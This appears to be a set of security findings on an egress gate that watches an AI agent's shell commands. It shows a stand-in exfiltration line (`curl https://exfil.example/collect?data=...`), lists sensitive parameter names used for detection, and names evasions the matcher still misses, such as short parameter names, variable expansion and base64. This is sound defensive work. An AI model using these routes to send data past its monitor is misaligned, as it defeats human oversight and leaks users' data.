    ## LOTOR-C1: Data leaves in a GET query string, ungated and uncaptured ### The leakage surface A plain GET carrying data in its query string is the most natural exfiltration path an agent can take, and Lotor v1's egress matcher did not see it. The `egress-other` gate matches on `--post` flags, `-d` data flags, remote publish tools, and authed remote clients. A `curl https://exfil.example/collect?data=<payload>` has none of those. It is a textbook GET read and passes every matcher in the chain. The capture hook writes nothing egress-shaped. A clean receipt and a missed exfiltration are indistinguishable. This is not a theoretical gap. It is the confession at confessions/C1: the matchers drive both capture and the gate, so a hole in one is a hole in both. ### Why query strings are uniquely dangerous GET query strings propagate through infrastructure that POST bodies do not. Ten concrete vectors, each independently sufficient for data loss: **1. Server access logs.** Every HTTP server, reverse proxy, and load balancer logs the full request URI by default. Apache Combined, nginx `$request_uri`, HAProxy `http-request capture`. These logs are rotated, shipped to SIEMs, and retained for compliance periods of months to years. A `?data=<secret>` lands in plaintext in every one. **2. Browser history.** Browsers store full URLs including query parameters. Anyone with physical or remote access to the machine can read them. Chromium stores history in an SQLite database (`History`) readable without the browser running. Firefox uses `places.sqlite`. Corporate device management can export this remotely. **3. Referrer headers.** When a response page contains links and the user clicks through, the `Referer` header sends the full origin URL (including query string) to the destination domain. `https://example.com/page?token=secret` followed by a link to `https://third-party.com/image.png` leaks the token to `third-party.com`. This is the exact scenario OWASP names: an authenticated user lands on a page with referrer leakage and the session token ships to every third-party resource on that page. **4. CDN and caching proxy cache keys.** CDNs (Cloudflare, CloudFront, Fastly) derive cache keys from the full URI including query parameters by default. A unique query string creates a unique cache entry. The data is now cached at edge nodes worldwide, served to anyone who constructs the same URL, and retained beyond the origin server's own retention. CloudFront's default cache key is `$(uri)$(query_string)`. **5. Corporate proxy and inspection logs.** enterprises deploying SSL inspection (Zscaler, Palo Alto, Blue Coat) log full URLs for DLP and compliance. The query string is decrypted, logged, and stored in centralized log aggregation. This is the exact environment where Lotor agents run: corporate-managed machines with deep packet inspection. **6. TLS SNI and DNS leakage.** While the query string itself is encrypted in TLS, the hostname is visible in the SNI extension and in DNS queries. An attacker who controls the DNS path or monitors network egress learns which host received the data. Combined with timing correlation, this is often sufficient. **7. Analytics and tracking scripts.** If a GET URL loads in a browser context (a follow-up page, a redirect chain), client-side analytics (Google Analytics, Segment, Mixpanel) capture the full URL including query parameters and transmit them to third-party endpoints. The `document.location.href` is the default source for page tracking. **8. HTTP/2 and HTTP/3 header compression dictionaries.** HPACK and QPACK use dynamic tables indexed by previous headers. A query string that appears in a request-header becomes a dictionary entry, compressing future references. On shared connections (connection pooling, HTTP/2 multiplexing), other requests on the same connection can reference that entry. This is the CRIME/BREACH class of compression side-channel, now applied to headers rather than cookies. **9. Web server error pages and debug output.** When a request with a query string triggers a server error (500, 404, 403), many frameworks dump the full request URL into the error page, error log, or debug output. Django's DEBUG mode, Rails development logs, Express.js error handlers all include `req.originalUrl`. The data is now in developer-facing surfaces that persist across deployments. **10. URL shorteners and link prefetchers.** Services like bit.ly, t.ly, and browser prefetch/predictive loading features fetch the target URL server-side. The query string is visible to the shortener's logs and to any DNS prefetch or preconnect that resolves the hostname. Chrome's prediction service pre-fetches URLs from omnibox input, including partial query strings. ### What the fix does The `hasDataCarryingQuery` function in `src/policy/index.js` (line 948) implements two complementary predicates: **Sensitive parameter names.** A fixed set (`data`, `payload`, `token`, `secret`, `key`, `password`, `credential`, `exfil`, `dump`, `leak`, `paste`, `collect`) whose presence with a non-empty value is data by construction. High precision, lower recall. **Payload-shaped values.** URL-decoded length over 64 characters AND percent-encoded, base64url-shaped, or hex-shaped. Higher recall, lower precision: catches `data=<blob>` under any parameter name. Presigned URL parameters (`X-Amz-*`, `X-Goog-*`) are exempted by name prefix because a signed GET is an ordinary read. Localhost targets are already exempted by the outer `isEgressOther` check. ### Regression tests `test/egress-query-string.test.js` contains 8 tests: - **3 must-gate:** long data value, sensitive-named parameter, base64-encoded payload. These fail against the unfixed matcher (prove-fail-first) and pass after. - **5 must-not-gate:** GitHub API read, npm registry query, search endpoint with short query, presigned S3 URL, localhost GET. These pass before and after, ensuring the fix does not flood on ordinary API reads. The prove-fail-first protocol is the acceptance standard: run against unpatched code (must fail on exfil cases), run against patched code (must pass on all cases). This is the regression test the card requires. ### Residual The matcher is a fence, not a proof. A parameter named `d` with a short value evades both predicates. This is the honest ceiling stated in the confession: the honest-agent threat model means the gate catches the class, not every instance. Adversarial obfuscation (shell variable expansion, base64 under a short name, wrapper binaries) remains out of scope for command-string matching (KNOWN-LIMITS 11). The capture side is now paired with the gate: the same `hasDataCarryingQuery` feeds both `PostToolUse` (capture) and `PreToolUse` (gate), so a gap in one is a gap in the other. This is the structural fix: not just catching more commands, but ensuring the gate and the log see the same surface.

    ## LOTOR-C1: GET query strings leak data through multiple channels The confessions API passes seal payloads and query parameters through GET query strings. This data appears in: - **Server access logs** (nginx/Apache default: full URI logged) - **Browser history** (full URL stored locally) - **Referer headers** (sent to any external resource loaded by the response) - **CDN/edge caches** (GET responses cacheable by default; query string in every proxy log) - **Proxy and load balancer logs** (ALB/NLB log full request URI) Demonstration: `curl "https://lotor.github.io/LOTOR/api/confessions.json?seal=35"` writes `seal=35` to nginx access.log in plaintext. **Fix:** Move sensitive parameters to POST body with `Content-Type: application/json`. Data never appears in URLs. **Residual:** Server still sees body data in request logging if body logging is enabled. TLS covers transit but not server-side request body logging.     ## C1 submission: URL query parameter data exposure Every GET request to the confessions endpoint embeds filter parameters in the URL. These URLs propagate through: 1. **Server logs** — nginx access_log format includes $request_uri by default.
